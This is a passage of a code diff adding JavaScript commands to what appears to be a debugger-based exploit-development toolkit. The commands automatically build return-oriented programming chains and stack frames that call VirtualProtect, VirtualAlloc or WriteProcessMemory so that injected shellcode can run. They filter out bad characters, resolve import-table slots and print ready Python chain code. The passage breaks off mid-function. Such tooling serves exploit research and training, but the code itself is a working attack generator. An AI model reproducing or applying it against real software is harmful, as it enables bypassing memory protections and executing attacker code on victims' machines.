+        badchars: Array.isArray(parseHexByteList(options.badchars)) ? parseHexByteList(options.badchars) : void 0
+      };
+      const plan = planVirtualProtect(currentRopCorpus, params, planRegisterSetupPacking, buildStableAddressPredicate());
+      const python = formatChainPython(plan);
+      const sectionLabel = plan.hasPushad ? "ROP Chain \u2014 VirtualProtect (PUSHAD)" : "ROP Register Setup \u2014 VirtualProtect (PUSHAD missing)";
+      section(sectionLabel);
+      if (!plan.hasPushad) {
+        warn("pushad ; ret gadget not found \u2014 output is a partial register-setup sketch, not an executable chain. Use frame_vp for a flat stdcall frame instead.");
+      }
+      info(`Mode: ${plan.mode} | Resolved gadgets: ${plan.satisfied.join(", ") || "(none)"} | Stack: ${plan.stackBytes} bytes`);
+      if (plan.placeholders.length > 0) {
+        info(`Define before use: ${plan.placeholders.join(", ")} (e.g. VIRTUALPROTECT via sc.iat_find("VirtualProtect"))`);
+      }
+      for (const line of python) {
+        print(line);
+      }
+      const warnings = [...plan.unsatisfied.map((entry) => `${entry.register}: ${entry.reason}`), ...plan.constraints];
+      for (const warning of warnings) {
+        warn(warning);
+      }
+      const rows = plan.steps.map((step) => {
+        var _a;
+        return {
+          Word: step.kind === "gadget" ? `0x${step.address.toString(16).toUpperCase().padStart(8, "0")}` : (_a = step.placeholder) != null ? _a : `0x${(step.value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
+          Meaning: step.comment
+        };
+      });
+      renderRows(sectionLabel, rows);
+      setResult({
+        command: "rop.chain_vp",
+        args: options,
+        success: plan.hasPushad && plan.unsatisfied.length === 0,
+        findings: [__spreadProps(__spreadValues({}, plan), { python })],
+        warnings,
+        errors: []
+      });
+      return toDxResult(sectionLabel, rows);
+    };
+    const executeRopChainWpm = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.chain_wpm");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP WriteProcessMemory Chain", rows2);
+        setResult({ command: "rop.chain_wpm", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
+        return toDxResult("ROP WriteProcessMemory Chain", rows2);
+      }
+      const chainWpmStale = staleCorpusGuard("ROP WriteProcessMemory Chain", "rop.chain_wpm");
+      if (chainWpmStale)
+        return chainWpmStale;
+      const options = isPlainObject(args[0]) ? args[0] : {
+        writeProcessMemory: args[0],
+        returnAddress: args[1],
+        lpBuffer: args[2],
+        nSize: args[3],
+        writable: args[4],
+        badchars: args[5]
+      };
+      const params = {
+        writeProcessMemory: options.writeProcessMemory !== void 0 ? Number(options.writeProcessMemory) : void 0,
+        returnAddress: options.returnAddress !== void 0 ? Number(options.returnAddress) : void 0,
+        lpBuffer: options.lpBuffer !== void 0 ? Number(options.lpBuffer) : void 0,
+        nSize: options.nSize !== void 0 ? Number(options.nSize) : void 0,
+        writable: options.writable !== void 0 ? Number(options.writable) : void 0,
+        badchars: Array.isArray(parseHexByteList(options.badchars)) ? parseHexByteList(options.badchars) : void 0
+      };
+      const plan = planWriteProcessMemory(currentRopCorpus, params, planRegisterSetupPacking, buildStableAddressPredicate());
+      const python = formatChainPython(plan);
+      const sectionLabel = plan.hasPushad ? "ROP Chain \u2014 WriteProcessMemory (PUSHAD)" : "ROP Register Setup \u2014 WriteProcessMemory (PUSHAD missing)";
+      section(sectionLabel);
+      if (!plan.hasPushad) {
+        warn("pushad ; ret gadget not found \u2014 output is a partial register-setup sketch, not an executable chain. Use frame_wpm for a flat stdcall frame instead.");
+      }
+      info(`Mode: ${plan.mode} | Resolved gadgets: ${plan.satisfied.join(", ") || "(none)"} | Stack: ${plan.stackBytes} bytes`);
+      if (plan.placeholders.length > 0) {
+        info(`Define before use: ${plan.placeholders.join(", ")}`);
+      }
+      for (const line of python) {
+        print(line);
+      }
+      const warnings = [...plan.unsatisfied.map((entry) => `${entry.register}: ${entry.reason}`), ...plan.constraints];
+      for (const warning of warnings) {
+        warn(warning);
+      }
+      const rows = plan.steps.map((step) => {
+        var _a;
+        return {
+          Word: step.kind === "gadget" ? `0x${step.address.toString(16).toUpperCase().padStart(8, "0")}` : (_a = step.placeholder) != null ? _a : `0x${(step.value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
+          Meaning: step.comment
+        };
+      });
+      renderRows(sectionLabel, rows);
+      setResult({
+        command: "rop.chain_wpm",
+        args: options,
+        success: plan.hasPushad && plan.unsatisfied.length === 0,
+        findings: [__spreadProps(__spreadValues({}, plan), { python })],
+        warnings,
+        errors: []
+      });
+      return toDxResult(sectionLabel, rows);
+    };
+    const executeRopChainVa = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.chain_va");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP VirtualAlloc Chain", rows2);
+        setResult({ command: "rop.chain_va", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
+        return toDxResult("ROP VirtualAlloc Chain", rows2);
+      }
+      const chainVaStale = staleCorpusGuard("ROP VirtualAlloc Chain", "rop.chain_va");
+      if (chainVaStale)
+        return chainVaStale;
+      const options = isPlainObject(args[0]) ? args[0] : {
+        virtualAlloc: args[0],
+        returnAddress: args[1],
+        lpAddress: args[2],
+        flAllocationType: args[3],
+        flProtect: args[4],
+        badchars: args[5]
+      };
+      const params = {
+        virtualAlloc: options.virtualAlloc !== void 0 ? Number(options.virtualAlloc) : void 0,
+        returnAddress: options.returnAddress !== void 0 ? Number(options.returnAddress) : void 0,
+        lpAddress: options.lpAddress !== void 0 ? Number(options.lpAddress) : void 0,
+        flAllocationType: options.flAllocationType !== void 0 ? Number(options.flAllocationType) : void 0,
+        flProtect: options.flProtect !== void 0 ? Number(options.flProtect) : void 0,
+        badchars: Array.isArray(parseHexByteList(options.badchars)) ? parseHexByteList(options.badchars) : void 0
+      };
+      const plan = planVirtualAlloc(currentRopCorpus, params, planRegisterSetupPacking, buildStableAddressPredicate());
+      const python = formatChainPython(plan);
+      const sectionLabel = plan.hasPushad ? "ROP Chain \u2014 VirtualAlloc (PUSHAD)" : "ROP Register Setup \u2014 VirtualAlloc (PUSHAD missing)";
+      section(sectionLabel);
+      if (!plan.hasPushad) {
+        warn("pushad ; ret gadget not found \u2014 output is a partial register-setup sketch, not an executable chain. Use frame_va for a flat stdcall frame instead.");
+      }
+      info(`Mode: ${plan.mode} | Resolved gadgets: ${plan.satisfied.join(", ") || "(none)"} | Stack: ${plan.stackBytes} bytes`);
+      if (plan.placeholders.length > 0) {
+        info(`Define before use: ${plan.placeholders.join(", ")}`);
+      }
+      for (const line of python) {
+        print(line);
+      }
+      const warnings = [...plan.unsatisfied.map((entry) => `${entry.register}: ${entry.reason}`), ...plan.constraints];
+      for (const warning of warnings) {
+        warn(warning);
+      }
+      const rows = plan.steps.map((step) => {
+        var _a;
+        return {
+          Word: step.kind === "gadget" ? `0x${step.address.toString(16).toUpperCase().padStart(8, "0")}` : (_a = step.placeholder) != null ? _a : `0x${(step.value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
+          Meaning: step.comment
+        };
+      });
+      renderRows(sectionLabel, rows);
+      setResult({
+        command: "rop.chain_va",
+        args: options,
+        success: plan.hasPushad && plan.unsatisfied.length === 0,
+        findings: [__spreadProps(__spreadValues({}, plan), { python })],
+        warnings,
+        errors: []
+      });
+      return toDxResult(sectionLabel, rows);
+    };
+    const executeRopFrameVp = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.frame_vp");
+      }
+      const options = isPlainObject(args[0]) ? args[0] : {
+        virtualProtect: args[0],
+        returnAddress: args[1],
+        lpAddress: args[2],
+        dwSize: args[3],
+        flNewProtect: args[4],
+        writable: args[5],
+        badchars: parseHexByteList(args[6])
+      };
+      const params = {
+        virtualProtect: options.virtualProtect !== void 0 ? Number(options.virtualProtect) : void 0,
+        returnAddress: options.returnAddress !== void 0 ? Number(options.returnAddress) : void 0,
+        lpAddress: options.lpAddress !== void 0 ? Number(options.lpAddress) : void 0,
+        dwSize: options.dwSize !== void 0 ? Number(options.dwSize) : void 0,
+        flNewProtect: options.flNewProtect !== void 0 ? Number(options.flNewProtect) : void 0,
+        writable: options.writable !== void 0 ? Number(options.writable) : void 0,
+        badchars: parseBadcharsOption(options.badchars)
+      };
+      return renderFlatFrame("rop.frame_vp", "ROP Frame \u2014 VirtualProtect (stdcall)", options, planVirtualProtectFrame(params));
+    };
+    const executeRopFrameWpm = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.frame_wpm");
+      }
+      const options = isPlainObject(args[0]) ? args[0] : {
+        writeProcessMemory: args[0],
+        returnAddress: args[1],
+        hProcess: args[2],
+        lpBaseAddress: args[3],
+        lpBuffer: args[4],
+        nSize: args[5],
+        writable: args[6],
+        badchars: parseHexByteList(args[7])
+      };
+      const params = {
+        writeProcessMemory: options.writeProcessMemory !== void 0 ? Number(options.writeProcessMemory) : void 0,
+        returnAddress: options.returnAddress !== void 0 ? Number(options.returnAddress) : void 0,
+        hProcess: options.hProcess !== void 0 ? Number(options.hProcess) : void 0,
+        lpBaseAddress: options.lpBaseAddress !== void 0 ? Number(options.lpBaseAddress) : void 0,
+        lpBuffer: options.lpBuffer !== void 0 ? Number(options.lpBuffer) : void 0,
+        nSize: options.nSize !== void 0 ? Number(options.nSize) : void 0,
+        writable: options.writable !== void 0 ? Number(options.writable) : void 0,
+        badchars: parseBadcharsOption(options.badchars)
+      };
+      return renderFlatFrame("rop.frame_wpm", "ROP Frame \u2014 WriteProcessMemory (stdcall)", options, planWriteProcessMemoryFrame(params));
+    };
+    const executeRopFrameVa = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.frame_va");
+      }
+      const options = isPlainObject(args[0]) ? args[0] : {
+        virtualAlloc: args[0],
+        returnAddress: args[1],
+        lpAddress: args[2],
+        dwSize: args[3],
+        flAllocationType: args[4],
+        flProtect: args[5],
+        badchars: parseHexByteList(args[6])
+      };
+      const params = {
+        virtualAlloc: options.virtualAlloc !== void 0 ? Number(options.virtualAlloc) : void 0,
+        returnAddress: options.returnAddress !== void 0 ? Number(options.returnAddress) : void 0,
+        lpAddress: options.lpAddress !== void 0 ? Number(options.lpAddress) : void 0,
+        dwSize: options.dwSize !== void 0 ? Number(options.dwSize) : void 0,
+        flAllocationType: options.flAllocationType !== void 0 ? Number(options.flAllocationType) : void 0,
+        flProtect: options.flProtect !== void 0 ? Number(options.flProtect) : void 0,
+        badchars: parseBadcharsOption(options.badchars)
+      };
+      return renderFlatFrame("rop.frame_va", "ROP Frame \u2014 VirtualAlloc (stdcall)", options, planVirtualAllocFrame(params));
+    };
+    const parseFrameWordToken = (token) => {
+      const t = token.trim();
+      const deref = /^\[\s*(0x)?([0-9a-fA-F]+)\s*\]$/.exec(t);
+      if (deref)
+        return { derefSlot: parseInt(deref[2], 16) >>> 0, comment: `*0x${deref[2]}` };
+      if (/^0x[0-9a-fA-F]+$/.test(t))
+        return { value: parseInt(t, 16) >>> 0, comment: t };
+      if (/^[0-9]+$/.test(t))
+        return { value: Number(t) >>> 0, comment: t };
+      if (/^[0-9a-fA-F]+$/.test(t)) {
+        return { value: parseInt(t, 16) >>> 0, comment: `0x${t} (assumed hex \u2014 no 0x prefix)`, assumedHex: true };
+      }
+      return { placeholder: t.toUpperCase(), comment: t };
+    };
+    const executeRopFrameWrite = (...args) => {
+      var _a;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.frame_write");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Write Frame", rows2);
+        setResult({ command: "rop.frame_write", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
+        return toDxResult("ROP Write Frame", rows2);
+      }
+      const stale = staleCorpusGuard("ROP Write Frame", "rop.frame_write");
+      if (stale)
+        return stale;
+      const bufToken = typeof args[0] === "string" ? args[0].trim() : void 0;
+      const wordsSpec = typeof args[1] === "string" ? args[1] : void 0;
+      const badchars = Array.isArray(parseHexByteList(args[2])) ? parseHexByteList(args[2]) : [];
+      const words2 = (wordsSpec != null ? wordsSpec : "").split(/[\s,]+/).filter((w) => w.length > 0).map(parseFrameWordToken);
+      if (!bufToken || words2.length === 0) {
+        const rows2 = [{ Error: 'rop.frame_write requires a buffer and ordered frame words, e.g. rop.frame_write("BUF", "VIRTUALALLOC POST_CALL 0x0 0x1000 0x3000 0x40", "00 0A 0D")' }];
+        renderRows("ROP Write Frame", rows2);
+        setResult({ command: "rop.frame_write", args: {}, success: false, findings: [], warnings: [], errors: ["Missing buffer or frame words."] });
+        return toDxResult("ROP Write Frame", rows2);
+      }
+      const buf = /^0x[0-9a-fA-F]+$/.test(bufToken) ? { value: parseInt(bufToken, 16) >>> 0 } : { placeholder: bufToken.toUpperCase() };
+      const plan = planWriteFrame(currentRopCorpus, buf, words2, badchars, buildStableAddressPredicate());
+      section("ROP Write Frame (no PUSHAD)");
+      for (const w of words2) {
+        if (w.assumedHex)
+          warn(`Frame word "${w.comment.split(" ")[0]}" had no 0x prefix \u2014 assumed hex ${hex32(__bi(w.value))}. Add 0x to be explicit.`);
+      }
+      if (plan.success) {
+        const g = plan.gadgets;
+        info(`Store: ${g.store !== void 0 ? hex32(g.store) : "?"} | Advance: ${g.advance !== void 0 ? hex32(g.advance) : "n/a"} | Pivot: ${g.pivot !== void 0 ? hex32(g.pivot) : "?"} | Stack: ${plan.stackBytes} bytes`);
+        if (plan.placeholders.length > 0)
+          info(`Define before use: ${plan.placeholders.join(", ")}`);
+        info("Frame layout (built in BUF, then ESP pivots onto it):");
+        words2.forEach((w, i) => {
+          var _a2;
+          const shown = w.derefSlot !== void 0 ? `*${hex32(w.derefSlot)}` : (_a2 = w.placeholder) != null ? _a2 : hex32(w.value);
+          print(`  BUF+0x${(i * 4).toString(16).padStart(2, "0")} = ${shown}  (${i === 0 ? "API (ret dispatches here)" : i === 1 ? "post-call target \u2014 MUST be executable" : `arg${i - 1}`})`);
+        });
+        const python = formatChainPython({ steps: plan.steps });
+        for (const line of python)
+          print(line);
+      }
+      for (const u of plan.unsatisfied)
+        warn(u);
+      if (!plan.success && plan.unsatisfied.length === 0)
+        warn("No frame produced.");
+      const rows = plan.steps.map((step) => {
+        var _a2;
+        return {
+          Type: step.kind,
+          Value: step.address !== void 0 ? hex32(step.address) : step.value !== void 0 ? hex32(step.value) : (_a2 = step.placeholder) != null ? _a2 : "",
+          Meaning: step.comment
+        };
+      });
+      if (rows.length === 0)
+        rows.push({ Type: "none", Value: "", Meaning: (_a = plan.unsatisfied[0]) != null ? _a : "no frame" });
+      renderRows("ROP Write Frame", rows);
+      setResult({
+        command: "rop.frame_write",
+        args: { buf: bufToken, words: words2.length, badchars },
+        success: plan.success,
+        findings: [{ steps: plan.steps, gadgets: plan.gadgets, placeholders: plan.placeholders }],
+        warnings: plan.unsatisfied,
+        errors: []
+      });
+      return toDxResult("ROP Write Frame", rows);
+    };
+    const executeRopSlotCall = (...args) => {
+      var _a, _b, _c;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.slot_call");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP Slot Call", rows2);
+        setResult({ command: "rop.slot_call", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
+        return toDxResult("ROP Slot Call", rows2);
+      }
+      const stale = staleCorpusGuard("ROP Slot Call", "rop.slot_call");
+      if (stale)
+        return stale;
+      const bufToken = typeof args[0] === "string" ? args[0].trim() : void 0;
+      const slotToken = typeof args[1] === "string" ? args[1].trim() : void 0;
+      const frameSpec = typeof args[2] === "string" ? args[2] : void 0;
+      const badchars = Array.isArray(parseHexByteList(args[3])) ? parseHexByteList(args[3]) : [];
+      const entrySkew = args[4] !== void 0 ? Number(args[4]) : 0;
+      if (!Number.isFinite(entrySkew) || entrySkew < 0 || entrySkew % 4 !== 0) {
+        const rows2 = [{ Error: `entrySkew must be a non-negative multiple of 4 (bytes the vuln's ret adds to ESP; e.g. 4 for 'ret 4'). Got: ${String(args[4])}` }];
+        renderRows("ROP Slot Call", rows2);
+        setResult({ command: "rop.slot_call", args: {}, success: false, findings: [], warnings: [], errors: ["Invalid entrySkew."] });
+        return toDxResult("ROP Slot Call", rows2);
+      }
+      const slot = slotToken && /^(0x)?[0-9a-fA-F]+$/.test(slotToken) ? parseInt(slotToken, 16) >>> 0 : void 0;
+      const frame = (frameSpec != null ? frameSpec : "").split(/[\s,]+/).filter((w) => w.length > 0).map(parseFrameWordToken);
+      if (!bufToken || slot === void 0 || frame.length === 0) {
+        const rows2 = [{ Error: 'rop.slot_call requires a buffer, an IAT slot, and a frame (retaddr + args), e.g. rop.slot_call("0x00420000", "0x1005D060", "SHELLCODE SHELLCODE 0x1000 0x1000 0x40", "00 0A 0D")' }];
+        renderRows("ROP Slot Call", rows2);
+        setResult({ command: "rop.slot_call", args: {}, success: false, findings: [], warnings: [], errors: ["Missing buffer, slot, or frame words."] });
+        return toDxResult("ROP Slot Call", rows2);
+      }
+      const buf = /^0x[0-9a-fA-F]+$/.test(bufToken) ? { value: parseInt(bufToken, 16) >>> 0 } : { placeholder: bufToken.toUpperCase() };
+      const plan = planSlotDispatch(currentRopCorpus, buf, slot, frame, badchars, buildStableAddressPredicate(), entrySkew);
+      section("ROP Slot Call (deref IAT slot + jmp <reg> dispatch)");
+      if (entrySkew > 0)
+        info(`Entry skew: ${entrySkew} bytes (vuln ret ${entrySkew}) -> ${entrySkew / 4} filler dword(s) after the entry gadget.`);
+      for (const w of frame) {
+        if (w.assumedHex)
+          warn(`Frame word "${w.comment.split(" ")[0]}" had no 0x prefix \u2014 assumed hex ${hex32(__bi(w.value))}. Add 0x to be explicit.`);
+      }
+      if (plan.success) {
+        const d = plan.dispatch;
+        const pr = (_a = d.ptrReg) != null ? _a : "reg";
+        const vr = (_b = d.valReg) != null ? _b : "reg";
+        info(`Deref preamble: pop ${pr} ${d.popPtr !== void 0 ? hex32(d.popPtr) : "?"} -> [${hex32(__bi(d.slot))}] via mov ${vr},[${pr}] ${d.deref !== void 0 ? hex32(d.deref) : "?"} -> jmp ${vr} ${d.jmp !== void 0 ? hex32(d.jmp) : "?"}`);
+        if (d.unstable.length > 0)
+          warn(`Preamble gadget(s) at a NON-stable address (will break if the module relocates): ${d.unstable.join(", ")}`);
+        info(`Stack: ${plan.stackBytes} bytes${plan.placeholders.length > 0 ? ` | Define before use: ${plan.placeholders.join(", ")}` : ""}`);
+        info("Frame layout (built in BUF, then ESP pivots onto it):");
+        print(`  BUF+0x00 = ${hex32(__bi(Number(d.popPtr)))}  (pop ${pr} ; ret)`);
+        print(`  BUF+0x04 = ${hex32(__bi(d.slot))}  (IAT slot -> popped into ${pr})`);
+        print(`  BUF+0x08 = ${hex32(__bi(Number(d.deref)))}  (mov ${vr},[${pr}] ; ret -> ${vr} = live API)`);
+        print(`  BUF+0x0c = ${hex32(__bi(Number(d.jmp)))}  (jmp ${vr} -> dispatch)`);
+        frame.forEach((w, i) => {
+          var _a2;
+          const shown = w.derefSlot !== void 0 ? `*${hex32(w.derefSlot)}` : (_a2 = w.placeholder) != null ? _a2 : hex32(w.value);
+          const role = i === 0 ? "API return target \u2014 MUST be executable" : `arg${i}`;
+          print(`  BUF+0x${((i + 4) * 4).toString(16).padStart(2, "0")} = ${shown}  (${role})`);
+        });
+        const python = formatChainPython({ steps: plan.steps });
+        for (const line of python)
+          print(line);
+      }
+      for (const u of plan.unsatisfied)
+        warn(u);
+      if (!plan.success && plan.unsatisfied.length === 0)
+        warn("No chain produced.");
+      const rows = plan.steps.map((step) => {
+        var _a2;
+        return {
+          Type: step.kind,
+          Value: step.address !== void 0 ? hex32(step.address) : step.value !== void 0 ? hex32(step.value) : (_a2 = step.placeholder) != null ? _a2 : "",
+          Meaning: step.comment
+        };
+      });
+      if (rows.length === 0)
+        rows.push({ Type: "none", Value: "", Meaning: (_c = plan.unsatisfied[0]) != null ? _c : "no chain" });
+      renderRows("ROP Slot Call", rows);
+      setResult({
+        command: "rop.slot_call",
+        args: { buf: bufToken, slot: hex32(__bi(slot)), frame: frame.length, badchars },
+        success: plan.success,
+        findings: [{ steps: plan.steps, dispatch: plan.dispatch, placeholders: plan.placeholders }],
+        warnings: [...plan.unsatisfied, ...plan.dispatch.unstable.map((u) => `non-stable preamble gadget: ${u}`)],
+        errors: []
+      });
+      return toDxResult("ROP Slot Call", rows);
+    };
+    const executeRopApiPlan = (...args) => {
+      var _a;
+      if (args.length === 1 && args[0] === "help")
+        return helperHelp("rop.api_plan");
+      const target = typeof args[0] === "string" ? args[0].trim() : "";
+      const badchars = parseBadcharsOption(args[1]);
+      if (!target) {
+        const rows2 = [{ Error: 'rop.api_plan requires an API name, e.g. rop.api_plan("KERNEL32!WriteProcessMemory", "00 0A 0D")' }];
+        renderRows("ROP API Resolution Planner", rows2);
+        setResult({ command: "rop.api_plan", args: {}, success: false, findings: [], warnings: [], errors: ["Missing target API."] });
+        return toDxResult("ROP API Resolution Planner", rows2);
+      }
+      const snapshot = sc.api_plan(target, badchars);
+      if (snapshot.error || !snapshot.target || !snapshot.targetIdentity) {
+        const message = (_a = snapshot.error) != null ? _a : "No target export was resolved.";
+        const rows2 = [{ Error: message }];
+        renderRows("ROP API Resolution Planner", rows2);
+        setResult({ command: "rop.api_plan", args: { target, badchars }, success: false, findings: [snapshot], warnings: [], errors: [message] });
+        return toDxResult("ROP API Resolution Planner", rows2);
+      }
+      const identity = snapshot.targetIdentity;
+      section("ROP API Resolution Planner (Phase 1 \u2014 discovery only)");
+      info(`Target: ${snapshot.target.module}!${snapshot.target.symbol} @ ${hex32(snapshot.target.address)} (RVA 0x${snapshot.target.exportRva.toString(16).toUpperCase()})`);
+      info(`Observed module: ${identity.name} base ${hex32(identity.base)} image base ${hex32(identity.imageBase)} size 0x${identity.sizeOfImage.toString(16).toUpperCase()} timestamp 0x${identity.timeDateStamp.toString(16).toUpperCase()} hash ${identity.hash}`);
+      info(`Snapshot provenance: stopped-debugger reads; target path ${identity.path || "<unknown>"}`);
+      info(`Badchars: ${badchars.length > 0 ? badchars.map((b) => b.toString(16).padStart(2, "0").toUpperCase()).join(" ") : "none specified"}`);
+      const rows = snapshot.candidates.map((candidate) => {
+        var _a2, _b;
+        return {
+          Strategy: candidate.strategy,
+          State: candidate.state,
+          Owner: candidate.ownerModule,
+          Slot: hex32(candidate.slot),
+          Pointer: hex32(candidate.pointer),
+          Anchor: (_b = (_a2 = candidate.anchor) == null ? void 0 : _a2.symbol) != null ? _b : "",
+          Delta: candidate.anchor ? hex32(candidate.anchor.delta) : "",
+          "Slot bytes": candidate.slotPayloadSafe ? "safe" : "contains badchar",
+          "Address evidence": candidate.exportRvaVerified ? "validated" : "incomplete",
+          Recommendation: candidate.recommendation
+        };
+      });
+      if (rows.length === 0) {
+        rows.push({
+          Strategy: "neither",
+          State: "DISCOVERED",
+          Owner: "",
+          Slot: "",
+          Pointer: "",
+          Anchor: "",
+          Delta: "",
+          "Slot bytes": "",
+          "Address evidence": "",
+          Recommendation: "No direct IAT slot or same-image exact-export anchor was established."
+        });
+      }
+      renderRows("ROP API Resolution Planner", rows);
+      const warnings = snapshot.candidates.filter((candidate) => !candidate.slotPayloadSafe).map((candidate) => `${candidate.strategy} slot ${hex32(candidate.slot)} contains a forbidden byte; this does not rule out dynamic address construction.`);
+      setResult({ command: "rop.api_plan", args: { target, badchars }, success: snapshot.candidates.length > 0, findings: [snapshot], warnings, errors: [] });
+      return toDxResult("ROP API Resolution Planner", rows);
+    };
+    const executeRopApiBuild = (...args) => {
+      var _a, _b, _c;
+      if (args.length === 1 && args[0] === "help")
+        return helperHelp("rop.api_build");
+      const options = isPlainObject(args[0]) ? args[0] : {
+        target: args[0],
+        badchars: args[1],
+        continuation: args[2],
+        preserve: args[3],
+        maxGadgets: args[4],
+        owner: args[5],
+        anchor: args[6]
+      };
+      const target = typeof options.target === "string" ? options.target.trim() : "";
+      const badchars = parseBadcharsOption(options.badchars);
+      const output = typeof options.output === "string" ? options.output : "eax";
+      const preserve = Array.isArray(options.preserve) ? options.preserve.filter((value) => typeof value === "string") : typeof options.preserve === "string" ? options.preserve.split(/[\s,]+/).filter(Boolean) : [];
+      const maxGadgets = options.maxGadgets !== void 0 ? Number(options.maxGadgets) : 12;
+      const continuation = options.continuation !== void 0 ? Number(options.continuation) : void 0;
+      const requestedOwner = typeof options.owner === "string" ? options.owner.trim().toLowerCase() : "";
+      const requestedAnchor = typeof options.anchor === "string" ? options.anchor.trim().toLowerCase() : "";
+      if (!target) {
+        const rows2 = [{ Error: 'rop.api_build requires target and continuation, e.g. rop.api_build("KERNEL32!WriteProcessMemory", "00 0A 0D", 0x10001000, "ecx").' }];
+        renderRows("ROP API Resolution Builder", rows2);
+        return toDxResult("ROP API Resolution Builder", rows2);
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("ROP API Resolution Builder", rows2);
+        return toDxResult("ROP API Resolution Builder", rows2);
+      }
+      const stale = staleCorpusGuard("ROP API Resolution Builder", "rop.api_build");
+      if (stale)
+        return stale;
+      const snapshot = sc.api_plan(target, badchars);
+      if (snapshot.error) {
+        const rows2 = [{ Error: snapshot.error }];
+        renderRows("ROP API Resolution Builder", rows2);
+        return toDxResult("ROP API Resolution Builder", rows2);
+      }
+      const matchesName = (actual, requested) => actual.toLowerCase().replace(/\.dll$/, "") === requested.replace(/\.dll$/, "");
+      const constrainedCandidates = snapshot.candidates.filter((candidate) => {
+        var _a2;
+        return (!requestedOwner || matchesName(candidate.ownerModule, requestedOwner)) && (!requestedAnchor || ((_a2 = candidate.anchor) == null ? void 0 : _a2.symbol.toLowerCase()) === requestedAnchor);
+      });
+      if ((requestedOwner || requestedAnchor) && constrainedCandidates.length === 0) {
+        const rows2 = [{ Error: `No Phase 1 candidate matches owner="${requestedOwner || "*"}" anchor="${requestedAnchor || "*"}".` }];
+        renderRows("ROP API Resolution Builder", rows2);
+        return toDxResult("ROP API Resolution Builder", rows2);
+      }
+      const globalFailures = [];
+      if (continuation === void 0)
+        globalFailures.push("A concrete continuation address is required after the final RET.");
+      else if (!dwordIsByteSafe(__bi(continuation), badchars))
+        globalFailures.push("Continuation address contains a forbidden byte.");
+      if (output.toLowerCase() !== "eax")
+        globalFailures.push("Phase 2 currently supports EAX output only.");
+      const selected = buildBestApiResolution(currentRopCorpus, constrainedCandidates, { output, preserve, maxGadgets, badchars, continuation });
+      if (!selected.candidate || !selected.plan) {
+        const rows2 = selected.attempts.map((attempt) => {
+          var _a2, _b2;
+          return {
+            Error: `${attempt.candidate.strategy} ${(_b2 = (_a2 = attempt.candidate.anchor) == null ? void 0 : _a2.symbol) != null ? _b2 : attempt.candidate.target.symbol}: ${attempt.rejectionReasons.join(" ")}`
+          };
+        });
+        if (rows2.length === 0)
+          rows2.push({ Error: "No address-validated Phase 1 resolution candidate is available. Run rop.api_plan to inspect unresolved imports, thunks, or forwarding." });
+        renderRows("ROP API Resolution Builder", rows2);
+        setResult({ command: "rop.api_build", args: { target, output, preserve, maxGadgets, badchars, continuation }, success: false, findings: [{ snapshot, attempts: selected.attempts }], warnings: rows2.map((row) => row.Error), errors: [] });
+        return toDxResult("ROP API Resolution Builder", rows2);
+      }
+      const plan = selected.plan;
+      section("ROP API Resolution Builder (Phase 2)");
+      info(`Strategy: ${selected.candidate.strategy} | Output: ${output.toUpperCase()} | Expected: ${plan.expectedOutput !== void 0 ? hex32(plan.expectedOutput) : "unavailable"}`);
+      info(`State: ${plan.state} \u2014 static composition only; CHAIN_VERIFIED requires debugger execution through rop.prove.`);
+      for (const note of plan.notes)
+        info(note);
+      if (globalFailures.length > 0) {
+        warn("Global constraints:");
+        for (const reason of globalFailures)
+          warn(`  ${reason}`);
+      }
+      for (const reason of plan.unsatisfied.filter((reason2) => !globalFailures.includes(reason2)))
+        warn(reason);
+      if (plan.clobbers.length > 0)
+        warn(`Clobbers: ${plan.clobbers.join(", ")}`);
+      const rejected = selected.attempts.filter((attempt) => attempt.rejectionReasons.length > 0);
+      if (rejected.length > 0) {
+        info(`Candidate evaluation: ${selected.attempts.length} considered; ${rejected.length} rejected.`);
+        const groups = /* @__PURE__ */ new Map();
+        for (const attempt of rejected) {
+          const label = (_b = (_a = attempt.candidate.anchor) == null ? void 0 : _a.symbol) != null ? _b : attempt.candidate.target.symbol;
+          for (const reason of attempt.rejectionReasons.filter((reason2) => !globalFailures.includes(reason2))) {
+            groups.set(reason, [...(_c = groups.get(reason)) != null ? _c : [], label]);
+          }
+        }
+        for (const [reason, labels] of groups) {
+          const examples = labels.slice(0, 3).join(", ");
+          const suffix = labels.length > 3 ? `, +${labels.length - 3} more` : "";
+          warn(`${reason} (${labels.length} candidate${labels.length === 1 ? "" : "s"}: ${examples}${suffix})`);
+        }
+      }
+      const rows = plan.steps.map((step, index) => {
+        var _a2;
+        return {
+          Index: String(index),
+          Type: step.kind,
+          Value: step.address !== void 0 ? hex32(step.address) : step.value !== void 0 ? hex32(__bi(step.value)) : (_a2 = step.placeholder) != null ? _a2 : "",
+          Meaning: step.comment
+        };
+      });
+      if (rows.length === 0)
+        rows.push({ Index: "", Type: "none", Value: "", Meaning: plan.unsatisfied.join(" ") || "No chain constructed." });
+      if (plan.state === "CHAIN_CONSTRUCTED") {
+        section("Python \u2014 API Resolution Fragment");
